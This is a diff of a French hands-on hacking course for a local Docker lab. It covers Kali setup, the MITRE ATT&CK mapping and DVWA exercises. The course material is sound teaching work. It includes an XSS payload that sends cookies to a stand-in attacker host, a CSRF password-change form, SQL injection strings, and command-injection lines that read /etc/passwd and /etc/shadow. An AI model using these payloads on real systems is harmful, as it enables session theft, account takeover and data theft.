@@ -18,141 +18,202 @@
 
 ## A.1 Prérequis Kali — Vérification
 
-Ouvrez un terminal sur votre machine Kali et exécutez les commandes suivantes. Chaque ligne doit retourner un numéro de version, pas d'erreur.
+Ouvrez un terminal sur votre machine Kali et exécutez chaque commande. Chaque ligne doit retourner un numéro de version, **pas d'erreur**.
 
 ```bash
-python3 --version        # Python 3.10 ou supérieur
-pip --version            # pip 22 ou supérieur
-docker --version         # Docker 24 ou supérieur
-docker compose version   # Docker Compose v2
-git --version            # Git 2.39 ou supérieur
-nmap --version           # Nmap 7.94
-msfconsole --version     # Metasploit 6.3
-sqlmap --version         # sqlmap 1.7
-gobuster --version       # Gobuster 3.6
-which nc                 # netcat
-curl --version           # curl 7.88
+python3 --version        # Doit afficher "Python 3.10" ou supérieur
+pip --version            # Doit afficher "pip 22" ou supérieur
+docker --version         # Doit afficher "Docker version 24" ou supérieur
+docker compose version   # Doit afficher "Docker Compose version v2"
+git --version            # Doit afficher "git version 2.39" ou supérieur
+nmap --version           # Doit afficher "Nmap version 7.94"
+msfconsole --version     # Doit afficher "Framework Version: 6.3"
+sqlmap --version         # Doit afficher "1.7"
+which nc                 # Doit afficher "/usr/bin/nc"
+curl --version           # Doit afficher "curl 7.88"
 ```
 
 Si un outil manque, installez-le :
 
 ```bash
-sudo apt update && sudo apt install -y docker.io docker-compose-v2 git nmap metasploit-framework sqlmap gobuster netcat-openbsd curl
+sudo apt update
+sudo apt install -y docker.io docker-compose-v2 git nmap metasploit-framework sqlmap netcat-openbsd curl
 sudo usermod -aG docker $USER
-# Redémarrer la session pour que le groupe docker prenne effet
+# → Redémarrer la session pour que le groupe docker prenne effet
 ```
 
 ## A.2 Création de l'arborescence de travail
 
 ```bash
 mkdir -p ~/cours-hacking/{jour-1,jour-2,jour-3,jour-4,jour-5,hors-serie}
-mkdir -p ~/cours-hacking/jour-1/labs
-mkdir -p ~/cours-hacking/jour-2/labs
-mkdir -p ~/cours-hacking/jour-3/labs
-mkdir -p ~/cours-hacking/jour-4/labs
-mkdir -p ~/cours-hacking/jour-5/labs
+mkdir -p ~/cours-hacking/jour-{1,2,3,4,5}/labs
 
-# Cloner le dépôt du cours
 cd ~/cours-hacking
 git clone https://github.com/yugmerabtene/techniques-hacking-mdj.git repo
 ```
 
-## A.3 Lancement de tous les conteneurs
+## A.3 Déterminer votre scénario
+
+Avant de lancer les conteneurs, exécutez le script de diagnostic :
 
 ```bash
 cd ~/cours-hacking/repo
-docker compose up -d
+bash scripts/network-diag.sh
+```
+
+Le script vous dira si vous êtes en :
+
+- **Scénario A** — Kali en machine hôte (VM ou bare metal). Les cibles sont sur `localhost:<port>`.
+- **Scénario B** — Kali dans un conteneur Docker. Les cibles sont accessibles par leur nom de service : `dvwa`, `vsftpd`, `buffovf`...
+
+Gardez ce diagnostic sous les yeux pendant tous les labs.
+
+## A.4 Lancement des conteneurs
+
+```bash
+cd ~/cours-hacking/repo
+
+# Scénario A (Kali hôte) — lancer les cibles uniquement
+docker compose up -d --build
+
+# Scénario B (Kali Docker) — lancer tout y compris le Kali attaquant
+docker compose --profile full up -d --build
 ```
 
 ```mermaid
 flowchart TB
-    subgraph KALI["💻 Kali Linux (Attaquant)"]
-        TOOLS["nmap · msfconsole · sqlmap<br/>wireshark · gobuster · nc"]
+    subgraph SCENARIO_A["Scenario A — Kali hôte"]
+        KALI_HOST["Kali Linux (hôte)<br/>nmap, msfconsole, sqlmap, curl"]
+        DOCKER_HOST["Docker Engine"]
+        DVWA_A["dvwa-target<br/>:8080"]
+        VSFTPD_A["vsftpd-target<br/>:21, :445"]
+        KALI_HOST -->|"localhost:8080"| DVWA_A
+        KALI_HOST -->|"localhost:21"| VSFTPD_A
     end
 
-    subgraph DOCKER["🐳 Docker — Conteneurs Vulnérables"]
-        DVWA["🕸️ DVWA<br/>:8080<br/>XSS · CSRF · SQLi · CMDi"]
-        VSFTPD["📁 vsftpd 2.3.4<br/>:21 · :445 · :3306<br/>FTP · SMB · MySQL"]
-        BUFFOVF["💥 Buffer Overflow<br/>:9001<br/>strcpy() vulnérable"]
-        WAF["🛡️ App + ModSecurity<br/>:8081<br/>WAF bypass"]
-        SECLINUX["🔧 Secure Linux<br/>:2222<br/>À durcir"]
-        FORENSIC["🔍 Forensic<br/>:8082<br/>Command injection"]
+    subgraph SCENARIO_B["Scenario B — Kali Docker"]
+        NET["Docker Network : pentest-lab"]
+        KALI_DOCKER["kali-attacker<br/>nmap, msfconsole"]
+        DVWA_B["dvwa-target<br/>:80"]
+        VSFTPD_B["vsftpd-target<br/>:21"]
+        KALI_DOCKER -->|"dvwa:80"| DVWA_B
+        KALI_DOCKER -->|"vsftpd:21"| VSFTPD_B
     end
-
-    KALI -->|scan & exploit| DVWA
-    KALI -->|scan & exploit| VSFTPD
-    KALI -->|buffer overflow| BUFFOVF
-    KALI -->|WAF bypass| WAF
-    KALI -->|hardening| SECLINUX
-    KALI -->|forensic| FORENSIC
 ```
 
-## A.4 Vérification de chaque vulnérabilité
+## A.5 Vérification de chaque vulnérabilité
 
-**Checklist obligatoire. Cochez chaque case avant de passer à la Partie 2.**
+### Définir les variables selon votre scénario
 
-### ☐ DVWA — Application Web Vulnérable (port 8080)
+```bash
+# Exécutez ce bloc UNE FOIS au début de la session.
+# Il définit $TARGET, $TARGET_PORT etc. pour tous les labs.
+
+if [ -f /.dockerenv ]; then
+    # ─── SCÉNARIO B — Kali dans Docker ───
+    TARGET_DVWA="dvwa"
+    TARGET_VSFTPD="vsftpd"
+    TARGET_WAF="waf-target"
+    TARGET_BUFFOVF="buffovf"
+    TARGET_SECLINUX="secure-linux"
+    TARGET_FORENSIC="forensic-victim"
+    PORT_DVWA="80"
+    PORT_VSFTPD="21"
+    PORT_SMB="445"
+    PORT_WAF="80"
+    PORT_BUFFOVF="9001"
+    PORT_SECLINUX="22"
+    PORT_FORENSIC="80"
+    echo "→ Scénario B : cibles par noms de service Docker"
+else
+    # ─── SCÉNARIO A — Kali en hôte ───
+    TARGET_DVWA="localhost"
+    TARGET_VSFTPD="localhost"
+    TARGET_WAF="localhost"
+    TARGET_BUFFOVF="localhost"
+    TARGET_SECLINUX="localhost"
+    TARGET_FORENSIC="localhost"
+    PORT_DVWA="8080"
+    PORT_VSFTPD="21"
+    PORT_SMB="445"
+    PORT_WAF="8081"
+    PORT_BUFFOVF="9001"
+    PORT_SECLINUX="2222"
+    PORT_FORENSIC="8082"
+    echo "→ Scénario A : cibles sur localhost"
+fi
+
+KALI_IP=$(hostname -I | awk '{print $1}')
+echo "→ Kali IP : $KALI_IP"
+echo "→ (utilisez cette IP pour les reverse shells et écouteurs HTTP)"
+```
+
+**Guarde ce terminal ouvert.** Toutes les commandes ci-dessous utilisent ces variables.
+
+### ☐ DVWA — Application Web Vulnérable
 
 ```bash
 # Le serveur répond ?
-curl -I http://localhost:8080/login.php
+curl -I "http://${TARGET_DVWA}:${PORT_DVWA}/login.php"
 # → HTTP/1.1 200 OK
 
-# Ouvrez dans Firefox
-firefox http://localhost:8080
-# Login : admin / password
-# Puis allez en bas → DVWA Security → réglez sur "low" → Submit
+# Ouvrir dans Firefox :
+# Scénario A : firefox http://localhost:8080
+# Scénario B : Les ports sont internes à Docker. Utilisez curl ou lynx dans le conteneur.
+#              Ou exposez le port 8080 de kali-attacker dans docker-compose si vous voulez Firefox.
+
+# Login DVWA : admin / password
+# Puis en bas → DVWA Security → régler sur "low" → Submit
 ```
 
-### ☐ vsftpd 2.3.4 — FTP Vulnérable (port 21)
+### ☐ vsftpd 2.3.4 — FTP Vulnérable
 
 ```bash
-# Vérifier la bannière
-echo "" | nc -w2 localhost 21
+echo "" | nc -w2 "$TARGET_VSFTPD" "$PORT_VSFTPD"
 # → 220 (vsFTPd 2.3.4)
 ```
 
-### ☐ Samba 3.0.20 — SMB Vulnérable (port 445)
+### ☐ Samba 3.0.20 — SMB Vulnérable
 
 ```bash
-nmap -sV -p 445 localhost -P0 | grep 445
+nmap -sV -p "$PORT_SMB" "$TARGET_VSFTPD" | grep 445
 # → 445/tcp open netbios-ssn Samba smbd 3.0.20
 ```
 
-### ☐ Buffer Overflow (port 9001)
+### ☐ Buffer Overflow
 
 ```bash
-nc -z localhost 9001 && echo "OK" || echo "Non lancé"
+nc -z "$TARGET_BUFFOVF" "$PORT_BUFFOVF" && echo "OK" || echo "Non lancé"
 # → OK
 ```
 
-### ☐ WAF Target (port 8081)
+### ☐ WAF Target
 
 ```bash
 # Requête normale → passe
-curl -s -o /dev/null -w "%{http_code}" "http://localhost:8081/?id=1"
+curl -s -o /dev/null -w "%{http_code}" "http://${TARGET_WAF}:${PORT_WAF}/?id=1"
 # → 200
 
 # SQLi brute → bloquée
-curl -s -o /dev/null -w "%{http_code}" "http://localhost:8081/?id=1 OR 1=1"
+curl -s -o /dev/null -w "%{http_code}" "http://${TARGET_WAF}:${PORT_WAF}/?id=1%20OR%201=1"
 # → 403 (Forbidden — WAF actif)
 ```
 
-### ☐ Secure Linux (port 2222)
+### ☐ Secure Linux
 
 ```bash
-nc -z localhost 2222 && echo "SSH accessible" || echo "Non lancé"
-# → SSH accessible
+nc -z "$TARGET_SECLINUX" "$PORT_SECLINUX" && echo "SSH OK" || echo "Non lancé"
+# → SSH OK
 ```
 
-### ☐ Forensic Victim (port 8082)
+### ☐ Forensic Victim
 
 ```bash
-curl "http://localhost:8082/?cmd=id"
-# → uid=33(www-data) gid=33(www-data) groups=33(www-data)
+curl "http://${TARGET_FORENSIC}:${PORT_FORENSIC}/?cmd=id"
+# → uid=33(www-data) gid=33(www-data)
 ```
 
-### ☐ Script de validation automatique
+### ☐ Validation automatique
 
 ```bash
 cd ~/cours-hacking/repo && bash tests/run_all.sh
@@ -169,7 +230,7 @@ cd ~/cours-hacking/repo && bash tests/run_all.sh
 
 Toute démarche de sécurité — offensive comme défensive — commence par la compréhension du paysage des menaces. Avant de lancer un scan ou d'exploiter une faille, il est indispensable de disposer d'un **langage commun** pour décrire les comportements adverses.
 
-Ce chapitre introduit le référentiel **MITRE ATT&CK**, qui deviendra votre boussole tout au long de cette formation. Chaque attaque, chaque vulnérabilité, chaque technique sera systématiquement rattachée à une entrée de la matrice ATT&CK. C'est le standard industriel adopté par les SOC, les CERT et les pentesters du monde entier.
+Ce chapitre introduit le référentiel **MITRE ATT&CK**, qui sera votre boussole tout au long de cette formation. Chaque attaque, chaque vulnérabilité, chaque technique sera rattachée à une entrée de la matrice.
 
 > **Sources :** [MITRE ATT&CK Framework](https://attack.mitre.org/) — The MITRE Corporation.
 
@@ -177,38 +238,28 @@ Ce chapitre introduit le référentiel **MITRE ATT&CK**, qui deviendra votre bou
 
 ## 1. MITRE ATT&CK — Le référentiel universel
 
-### Comprendre le concept
-
-MITRE ATT&CK est une base de connaissances qui référence les **tactiques**, **techniques** et **procédures** (TTPs) utilisées par les groupes cybercriminels et les APTs (Advanced Persistent Threats).
-
-- **Tactique** = l'objectif de l'attaquant : accès initial, escalade, exfiltration...
-- **Technique** = la méthode concrète : phishing, buffer overflow, injection SQL...
-- **Procédure** = l'implémentation spécifique d'un groupe d'attaquants
-
 ```mermaid
 flowchart TB
-    TA0001["🔍 TA0001<br/>Reconnaissance"] --> TA0002["🔧 TA0002<br/>Resource Development"]
-    TA0002 --> TA0003["🚪 TA0003<br/>Initial Access"]
-    TA0003 --> TA0004["⚡ TA0004<br/>Execution"]
-    TA0004 --> TA0005["📌 TA0005<br/>Persistence"]
-    TA0005 --> TA0006["⬆️ TA0006<br/>Privilege Escalation"]
-    TA0006 --> TA0007["🕵️ TA0007<br/>Defense Evasion"]
-    TA0007 --> TA0008["🔑 TA0008<br/>Credential Access"]
-    TA0008 --> TA0009["🔎 TA0009<br/>Discovery"]
-    TA0009 --> TA0010["↔️ TA0010<br/>Lateral Movement"]
-    TA0010 --> TA0011["📦 TA0011<br/>Collection"]
-    TA0011 --> TA0012["📡 TA0012<br/>Command & Control"]
-    TA0012 --> TA0013["📤 TA0013<br/>Exfiltration"]
-    TA0013 --> TA0014["💥 TA0014<br/>Impact"]
+    TA0001["TA0001 Reconnaissance"] --> TA0002["TA0002 Resource Development"]
+    TA0002 --> TA0003["TA0003 Initial Access"]
+    TA0003 --> TA0004["TA0004 Execution"]
+    TA0004 --> TA0005["TA0005 Persistence"]
+    TA0005 --> TA0006["TA0006 Privilege Escalation"]
+    TA0006 --> TA0007["TA0007 Defense Evasion"]
+    TA0007 --> TA0008["TA0008 Credential Access"]
+    TA0008 --> TA0009["TA0009 Discovery"]
+    TA0009 --> TA0010["TA0010 Lateral Movement"]
+    TA0010 --> TA0011["TA0011 Collection"]
+    TA0011 --> TA0012["TA0012 Command & Control"]
+    TA0012 --> TA0013["TA0013 Exfiltration"]
+    TA0013 --> TA0014["TA0014 Impact"]
 ```
-
-**Matrice simplifiée du Jour 1 :**
 
 | Tactique (TA) | Techniques (T) | Exemple concret |
 |---|---|---|
 | TA0001 Reconnaissance | T1595 Active Scanning | nmap |
-| TA0003 Initial Access | T1566 Phishing, T1190 Exploit Public-Facing App, T1189 Drive-by Compromise | Email piégé, SQLi, XSS |
-| TA0002 Execution | T1059 Command & Scripting Interpreter | Reverse shell, command injection |
+| TA0003 Initial Access | T1566 Phishing, T1190 Exploit Public-Facing App, T1189 Drive-by Compromise | Email, SQLi, XSS |
+| TA0002 Execution | T1059 Command & Scripting Interpreter | Reverse shell, cmd injection |
 
 > **Sources :** [ATT&CK Enterprise Matrix](https://attack.mitre.org/matrices/enterprise/) — MITRE.
 
@@ -216,30 +267,24 @@ flowchart TB
 
 ## 2. Types de hackers et panorama des attaques
 
-### Profils d'attaquants
-
 ```mermaid
 flowchart LR
-    A["👤 Types de Hackers"] --> B["⚪ White Hat<br/>Pentester, chercheur<br/>Cadre légal, autorisé"]
-    A --> C["⚫ Black Hat<br/>Criminel<br/>Motivation financière"]
-    A --> D["🔘 Grey Hat<br/>Zone grise<br/>Sans autorisation, sans malveillance"]
-    A --> E["🎯 Hacktiviste<br/>Militant<br/>Motivation politique"]
-    A --> F["🏴 APT / Étatique<br/>APT29, Lazarus<br/>Motivation étatique"]
+    A["Types de Hackers"] --> B["White Hat — Pentester, chercheur<br/>Cadre légal, autorisé"]
+    A --> C["Black Hat — Criminel<br/>Motivation financière"]
+    A --> D["Grey Hat — Zone grise<br/>Sans autorisation, sans malveillance"]
+    A --> E["Hacktiviste — Militant<br/>Motivation politique"]
+    A --> F["APT / Étatique — APT29, Lazarus<br/>Motivation étatique"]
 ```
-
-Chaque groupe APT documenté dans MITRE ATT&CK possède une fiche dédiée avec ses techniques favorites. Exemple : APT29 (Cozy Bear) utilise T1566 (Spearphishing), T1059 (Command Scripting), T1027 (Obfuscated Files).
 
 ### Panorama des attaques — Mapping ATT&CK
 
 | Attaque | Technique ATT&CK | ID | Tactic | Impact |
 |---|---|---|---|---|
-| Phishing | Spearphishing Attachment | T1566.001 | Initial Access | Compromission de comptes |
-| DDoS | Endpoint Denial of Service | T1499 | Impact | Indisponibilité de service |
-| Injection SQL | Exploit Public-Facing Application | T1190 | Initial Access | Vol/exfiltration de données |
-| XSS | Drive-by Compromise | T1189 | Initial Access | Vol de session, defacement |
-| CSRF | Exploitation for Client Execution | T1203 | Execution | Actions non autorisées |
-
-> **Sources :** [ATT&CK Techniques](https://attack.mitre.org/techniques/enterprise/) — MITRE.
+| Phishing | Spearphishing Attachment | T1566.001 | TA0003 Initial Access | Compromission de comptes |
+| DDoS | Endpoint Denial of Service | T1499 | TA0014 Impact | Indisponibilité |
+| Injection SQL | Exploit Public-Facing Application | T1190 | TA0003 Initial Access | Vol/exfiltration de données |
+| XSS | Drive-by Compromise | T1189 | TA0003 Initial Access | Vol de session |
+| CSRF | Exploitation for Client Execution | T1203 | TA0004 Execution | Actions non autorisées |
 
 ---
 
@@ -247,76 +292,63 @@ Chaque groupe APT documenté dans MITRE ATT&CK possède une fiche dédiée avec 
 
 ### nmap — Cartographie réseau → T1046 Network Service Scanning
 
-nmap est l'outil de reconnaissance réseau par excellence. Il identifie les hôtes actifs, les ports ouverts et les versions de services.
-
 ```bash
-nmap -sV <IP>         # Scan avec détection de version
-nmap -F <IP>/24        # Scan rapide des 100 ports les plus courants
-nmap -A <IP>           # Détection complète (OS, versions, scripts)
-nmap --script vuln <IP> # Scan de vulnérabilités connuess
+nmap -sV <IP>              # Scan avec version
+nmap -F <IP>/24            # Scan rapide
+nmap -A <IP>               # OS + version + scripts
+nmap --script vuln <IP>    # Scan de vulnérabilités
 ```
 
 ### Metasploit — Framework d'exploitation
 
-Metasploit intègre des milliers d'exploits, de payloads et de modules auxiliaires. C'est l'outil central des phases TA0003 → TA0004 → TA0006 du cycle ATT&CK.
-
 ```bash
-msfconsole              # Lancer la console
-search <mot-clé>        # Rechercher un exploit
-use <chemin/exploit>    # Sélectionner un exploit
-set RHOSTS <IP>         # Configurer la cible
-exploit                 # Lancer l'attaque
+msfconsole                  # Lancer la console
+search <mot-clé>            # Rechercher un exploit
+use <chemin/exploit>        # Sélectionner
+set RHOSTS <IP>             # Configurer la cible
+exploit                     # Lancer
 ```
 
 ### Wireshark — Analyse de paquets → T1040 Network Sniffing
 
-Filtres de capture essentiels :
-
 ```
-http                      # Trafic HTTP uniquement
-tcp.port == 80            # Port 80
-ip.addr == 192.168.x.x    # Trafic lié à une IP
-tcp.flags.syn == 1        # Paquets SYN
+http                         # Trafic HTTP
+tcp.port == 80               # Port 80
+ip.addr == <IP>              # IP spécifique
+tcp.flags.syn == 1           # Paquets SYN
 ```
 
-> **Sources :** [nmap Network Scanning](https://nmap.org/book/) — Gordon Lyon. [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/) — Offensive Security.
+> **Sources :** [nmap Book](https://nmap.org/book/). [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/).
 
 ---
 
 ## 4. Vulnérabilités web — Mapping ATT&CK
 
-### XSS (Cross-Site Scripting) → T1189 Drive-by Compromise
-
-L'attaquant injecte du JavaScript malveillant exécuté dans le navigateur de la victime.
+### XSS → T1189 Drive-by Compromise
 
 ```mermaid
 flowchart LR
-    A["👤 Victime<br/>Navigateur"] -->|1. Visite page infectée| B["🖥️ Serveur Vulnérable<br/>Reflète le script"]
-    B -->|2. Page + script injecté| A
-    A -->|3. Script exécuté<br/>vole cookie/session| C["💀 Attaquant<br/>Reçoit cookie volé"]
+    A["Victime<br/>Navigateur"] -->|"1. Visite page infectée"| B["Serveur Vulnérable<br/>Reflète le script"]
+    B -->|"2. Page + script"| A
+    A -->|"3. Cookie volé"| C["Attaquant<br/>Reçoit cookie"]
 ```
 
-**Reflected XSS :** le payload est dans l'URL, reflété immédiatement.
-**Stored XSS :** le payload est stocké en base et exécuté à chaque affichage.
+Reflected XSS : payload dans l'URL, reflété immédiatement.
+Stored XSS : payload stocké en base, exécuté à chaque affichage.
 
 ```html
 <!-- Payload de test -->
 <script>alert('XSS')</script>
 
 <!-- Payload de vol de cookie -->
-<script>new Image().src='http://<KALI_IP>:8000/?c='+document.cookie</script>
+<script>new Image().src='http://<KALI_IP>:8000/?cookie='+document.cookie</script>
 ```
 
-**Mapping ATT&CK :** XSS → T1189 Drive-by Compromise → TA0001 Initial Access. Si le cookie est volé → T1539 Steal Web Session Cookie → TA0008 Credential Access.
-
-### CSRF (Cross-Site Request Forgery) → T1203 Exploitation for Client Execution
-
-Le CSRF force un utilisateur authentifié à exécuter une action sans son consentement.
+### CSRF → T1203 Exploitation for Client Execution
 
 ```html
-<!-- Page malveillante hébergée côté attaquant -->
 <html><body>
-  <form action="http://<TARGET>/change_password.php" method="POST">
+  <form action="http://<SITE>/change_password.php" method="POST">
     <input type="hidden" name="new_password" value="hacked">
     <input type="hidden" name="confirm_password" value="hacked">
   </form>
@@ -326,32 +358,20 @@ Le CSRF force un utilisateur authentifié à exécuter une action sans son conse
 
 ### Injection SQL → T1190 Exploit Public-Facing Application
 
-L'injection consiste à insérer du code SQL dans une entrée utilisateur non filtrée.
-
 ```sql
 -- Contournement d'authentification
 admin' OR '1'='1' --
 
--- Extraction de données (UNION-based)
+-- Extraction UNION-based
 ' UNION SELECT username, password FROM users --
-
--- Destruction de base (très dangereux)
-'; DROP TABLE users; --
-```
-
-```mermaid
-flowchart LR
-    A["👤 Attaquant<br/>Envoie requête piégée"] --> B["🖥️ Serveur Web<br/>Reçoit id=1' OR '1'='1"]
-    B --> C["🗄️ Base de données<br/>WHERE id='1' OR '1'='1'<br/>→ TOUJOURS VRAI"]
-    C --> D["📤 Toutes les lignes<br/>retournées à l'attaquant"]
 ```
 
 ### Command Injection → T1059.004 Unix Shell
 
 ```bash
-; ls -la /etc/passwd     # Exécute ls après la commande prévue
-| whoami                  # Alternative avec pipe
-&& cat /etc/shadow        # Chaîne avec AND
+; ls -la /etc/passwd
+| whoami
+&& cat /etc/shadow
 ```
 
 > **Sources :** [OWASP Top 10](https://owasp.org/www-project-top-ten/) — OWASP Foundation.
@@ -365,100 +385,80 @@ flowchart LR
 | Propriété | Valeur |
 |---|---|
 | **Durée** | 30 min |
-| **Conteneur** | `dvwa` (port 8080) |
+| **Conteneur** | `dvwa` |
 | **Dossier de travail** | `~/cours-hacking/jour-1/labs/` |
 | **Fichiers à créer** | `scan_dvwa.sh` |
-| **Outils** | nmap, curl, Firefox |
+| **Outils** | nmap, curl |
 
-### Prérequis avant de commencer
+### Prérequis
 
-- [x] Tous les conteneurs lancés (`docker compose up -d`)
-- [x] DVWA répond sur http://localhost:8080
+- [x] Conteneurs lancés (`docker compose up -d`)
+- [x] DVWA répond sur `http://${TARGET_DVWA}:${PORT_DVWA}/login.php`
 - [x] Terminal ouvert dans `~/cours-hacking/jour-1/labs/`
+- [x] Variables d'environnement chargées (voir A.5)
 
-### Étape 1 — Scan nmap du conteneur DVWA
+### Étape 1 — Scan nmap
 
 ```bash
 cd ~/cours-hacking/jour-1/labs
-
-# Scan complet du port exposé
-nmap -sV -p 8080 localhost -P0 | tee nmap_dvwa.txt
+nmap -sV -p "$PORT_DVWA" "$TARGET_DVWA" | tee nmap_dvwa.txt
 ```
 
-**Résultat attendu :**
+Résultat attendu (Scénario A) :
 
 ```
 PORT     STATE SERVICE VERSION
-8080/tcp open  http    Apache httpd 2.4.X (Debian)
+8080/tcp open  http    Apache httpd 2.4.X
+```
+
+Résultat attendu (Scénario B) :
+
+```
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.X
 ```
 
 ### Étape 2 — Découverte des pages avec gobuster
 
 ```bash
-gobuster dir -u http://localhost:8080 -w /usr/share/wordlists/dirb/common.txt -q | tee gobuster_dvwa.txt
+gobuster dir -u "http://${TARGET_DVWA}:${PORT_DVWA}" \
+  -w /usr/share/wordlists/dirb/common.txt -q | tee gobuster_dvwa.txt
 ```
 
-**Résultat attendu (extrait) :**
+Résultat attendu (extrait) :
 
 ```
 /.hta                 (Status: 403)
-/.htaccess            (Status: 403)
-/.htpasswd            (Status: 403)
 /config               (Status: 301)
-/docs                 (Status: 301)
-/external             (Status: 301)
 /index.php            (Status: 302)
 /login.php            (Status: 200)
-/phpinfo.php          (Status: 200)
 /vulnerabilities      (Status: 301)
 ```
 
-### Étape 3 — Accès et configuration DVWA
+### Étape 3 — Accès DVWA
 
 ```bash
-# Ouvrir dans Firefox
-firefox http://localhost:8080 &
+# Scénario A : Firefox
+firefox "http://${TARGET_DVWA}:${PORT_DVWA}" &
 
-# 1. Login : admin / password
-# 2. Tout en bas : cliquer "DVWA Security"
-# 3. Régler sur "low" → Submit
-# 4. Le menu de gauche montre les vulnérabilités disponibles
-```
+# Scénario B : curl ou lynx dans le conteneur kali-attacker
+# Connexion : admin / password
+# Puis en bas de page → DVWA Security → régler sur "low" → Submit
 
-### Étape 4 — Vérification des vulnérabilités présentes
-
-Dans le menu gauche de DVWA, vous devez voir :
-
-```
-DVWA Menu
-├── Brute Force
-├── Command Injection    ← nous allons l'exploiter
-├── CSRF                 ← nous allons l'exploiter
-├── File Inclusion
-├── File Upload
-├── Insecure CAPTCHA
-├── SQL Injection        ← nous allons l'exploiter
-├── SQL Injection (Blind)
-├── Weak Session IDs
-├── XSS (DOM)
-├── XSS (Reflected)      ← nous allons l'exploiter
-├── XSS (Stored)         ← nous allons l'exploiter
-└── CSP Bypass
+# Vérifier que le login fonctionne via curl avec cookie
+curl -s -c /tmp/dvwa_cookie.txt \
+  -d "username=admin&password=password&Login=Login" \
+  "http://${TARGET_DVWA}:${PORT_DVWA}/login.php" \
+  | grep -o "Login failed\|Welcome"
+# → Doit afficher "Welcome" = login réussi
 ```
 
 ### Checkpoints
 
-- [ ] nmap trouve le port 8080 ouvert avec Apache
+- [ ] nmap trouve le port ouvert avec Apache
 - [ ] gobuster trouve `/login.php`, `/vulnerabilities`, `/config`
 - [ ] Connexion DVWA réussie (admin/password)
-- [ ] Niveau de sécurité réglé sur **low**
-- [ ] Les pages XSS, CSRF, SQLi, Command Injection sont accessibles
-
-### Erreurs fréquentes
-
-- **DVWA inaccessible** → `docker compose ps dvwa` ; si "down" → `docker compose up -d dvwa`
-- **PHP erreurs** → le conteneur met ~30s à initialiser la DB. Attendre puis rafraîchir
-- **gobuster rien trouvé** → `apt install gobuster` ; la wordlist est dans `/usr/share/wordlists/dirb/common.txt`
+- [ ] Niveau de sécurité **low** configuré
 
 ---
 
@@ -469,70 +469,77 @@ DVWA Menu
 | Propriété | Valeur |
 |---|---|
 | **Durée** | 30 min |
-| **Conteneur** | `dvwa` (port 8080) |
+| **Conteneur** | `dvwa` |
 | **Dossier de travail** | `~/cours-hacking/jour-1/labs/` |
-| **Fichiers à créer** | `xss_payload.txt`, `steal_cookie.html` |
 | **Technique ATT&CK** | T1189 Drive-by Compromise |
 
-### Prérequis avant de commencer
+### Prérequis
 
-- [x] DVWA connecté (admin/password), sécurité **low**
-- [x] Côté Kali, un terminal prêt pour l'écouteur HTTP
+- [x] DVWA connecté, sécurité **low**
+- [x] Cookie de session récupéré (depuis le navigateur ou le fichier `/tmp/dvwa_cookie.txt`)
 
-### Étape 1 — XSS Reflété : popup de test
+### Étape 1 — XSS Reflété : test popup
 
-Dans DVWA → **XSS (Reflected)** :
+Dans DVWA → **XSS (Reflected)**. Champ "What's your name?" :
 
 ```
-Champ "What's your name?" : <script>alert('XSS fonctionnel')</script>
-Cliquer "Submit"
+<script>alert('XSS fonctionnel')</script>
 ```
 
-**Checkpoint A :** Une popup JavaScript apparaît. La faille XSS reflétée est confirmée.
+Cliquer "Submit". **Checkpoint :** Popup JavaScript apparaît.
 
 ### Étape 2 — XSS Reflété : vol de cookie
 
-Ouvrez un **deuxième terminal Kali** et lancez un écouteur HTTP :
+**Terminal 1 — Kali (écouteur HTTP) :**
 
 ```bash
-cd ~/cours-hacking/jour-1/labs/
+cd ~/cours-hacking/jour-1/labs
 python3 -m http.server 8000
 # Serving HTTP on 0.0.0.0 port 8000
 ```
 
-Dans le premier terminal, préparez le payload :
+**Terminal 2 — Payload dans DVWA :**
 
 ```html
 <script>new Image().src='http://<KALI_IP>:8000/?cookie='+document.cookie</script>
 ```
 
-Remplacez `<KALI_IP>` par l'IP de votre Kali (trouvez-la avec `ip addr show eth0` ou `hostname -I`).
+**Remplacez `<KALI_IP>` par la vraie IP.** Pour la trouver :
 
-Collez ce payload dans le champ XSS Reflected de DVWA et soumettez.
+```bash
+# Connaître votre IP Kali
+hostname -I | awk '{print $1}'
 
-**Checkpoint B :** Dans le terminal de l'écouteur HTTP, vous voyez apparaître :
+# Scénario A : si le conteneur DVWA ne peut pas joindre votre IP externe,
+# utilisez l'IP du bridge Docker :
+ip addr show docker0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
+# → généralement 172.17.0.1
+
+# Scénario B : utilisez l'IP du conteneur Kali (hostname -I)
+```
+
+**Checkpoint :** Dans le terminal de l'écouteur, vous voyez :
 
 ```
-<IP> - - [date] "GET /?cookie=PHPSESSID=abc123...;security=low HTTP/1.1" 200 -
+<IP> - - [date] "GET /?cookie=PHPSESSID=abc123... HTTP/1.1" 200 -
 ```
 
-Le cookie de session DVWA a été volé via XSS.
+Le cookie de session DVWA a été volé.
 
 ### Étape 3 — XSS Stocké : persistance
 
 Dans DVWA → **XSS (Stored)** :
 
 ```
-Champ "Name" : Attaquant
+Champ "Name"    : Attaquant
 Champ "Message" : <script>alert('Stored XSS')</script>
-Cliquer "Sign Guestbook"
 ```
 
-**Checkpoint C :** La popup apparaît. Actualisez la page : la popup réapparaît. Le script est stocké dans la base de données et s'exécute à chaque visite. C'est la différence clé avec le XSS reflété.
+Cliquer "Sign Guestbook". **Checkpoint :** La popup apparaît. Actualisez la page : elle réapparaît. Stocké en base.
 
 ### Nettoyage
 
-Dans DVWA → **Setup / Reset DB** → cliquer "Create / Reset Database" pour effacer le XSS stocké.
+Dans DVWA → **Setup / Reset DB** → cliquer "Create / Reset Database" pour nettoyer le XSS stocké.
 
 ---
 
@@ -543,40 +550,48 @@ Dans DVWA → **Setup / Reset DB** → cliquer "Create / Reset Database" pour ef
 | Propriété | Valeur |
 |---|---|
 | **Durée** | 30 min |
-| **Conteneur** | `dvwa` (port 8080) |
+| **Conteneur** | `dvwa` |
 | **Dossier de travail** | `~/cours-hacking/jour-1/labs/` |
 | **Technique ATT&CK** | T1190 Exploit Public-Facing Application |
 
-### Prérequis avant de commencer
+### Prérequis
 
 - [x] DVWA connecté, sécurité **low**
-- [x] Cookie PHPSESSID copié depuis Firefox (F12 → Storage → Cookies)
+- [x] Cookie PHPSESSID récupéré
 
-### Étape 1 — Test manuel de la SQLi
-
-Dans DVWA → **SQL Injection** :
-
-```
-Champ "User ID" : 1' OR '1'='1' #
-Cliquer "Submit"
-```
-
